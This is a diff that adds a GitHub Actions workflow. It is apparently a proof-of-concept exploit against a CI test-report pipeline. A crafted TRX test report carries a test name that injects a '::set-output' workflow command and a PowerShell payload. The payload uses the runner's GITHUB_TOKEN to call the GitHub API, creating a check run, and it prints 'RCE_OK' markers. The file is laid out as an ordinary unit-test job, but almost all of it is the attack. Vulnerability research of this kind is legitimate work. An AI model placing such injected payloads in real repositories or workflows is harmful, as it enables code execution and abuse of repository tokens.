@@ -1,0 +1,44 @@
+name: ci
+on:
+  pull_request:
+    branches: [ main ]
+  push:
+    branches: [ main, feature/*, hotfix/* ]
+  workflow_dispatch:
+
+env:
+  NO_COLOR: true
+
+jobs:
+  unit-test:
+    runs-on: ubuntu-latest
+    timeout-minutes: 30
+    steps:
+    - name: Produce attacker controlled test report
+      run: |
+        mkdir -p test/TestResults
+        touch msbuild.binlog
+        cat > test/TestResults/a.trx <<'TRX'
+        <?xml version="1.0" encoding="utf-8"?>
+        <TestRun>
+          <Times start="2026-01-01T00:00:00.000Z" finish="2026-01-01T00:00:02.000Z" />
+          <TestDefinitions>
+            <UnitTest id="1" name="Evil">
+              <TestMethod codeBase="x" className="Evil.Class" name="EvilMethod" />
+            </UnitTest>
+          </TestDefinitions>
+          <Results>
+            <UnitTestResult testId="1" testName="EvilTest&#10;::set-output name=url_html::&quot;; Write-Output ('RCE_OK token_len=' + $env:GITHUB_TOKEN.Length); try { $h=@{Authorization=('Bearer ' + $env:GITHUB_TOKEN)}; Invoke-RestMethod -Method Post -Uri 'https://api.github.com/repos/PDFtoMark/gab-poc-docfx-reports/check-runs' -Headers $h -ContentType 'application/json' -Body (@{name='poc-check-run';head_sha=$env:GITHUB_SHA;status='completed';conclusion='success'}|ConvertTo-Json) | Out-Null; Write-Output 'RCE_OK check_run_created' } catch { Write-Output ('RCE_OK check_run_error: ' + $_.Exception.Message) }; &quot;" outcome="Passed" duration="00:00:01" />
+          </Results>
+        </TestRun>
+        TRX
+        cat test/TestResults/a.trx
+
+    - name: Upload Logs
+      uses: actions/upload-artifact@v7
+      if: ${{ !cancelled() }}
+      with:
+        name: logs-ubuntu-latest-net10.0
+        path: |
+          msbuild.binlog
+          test/**/TestResults/*.trx
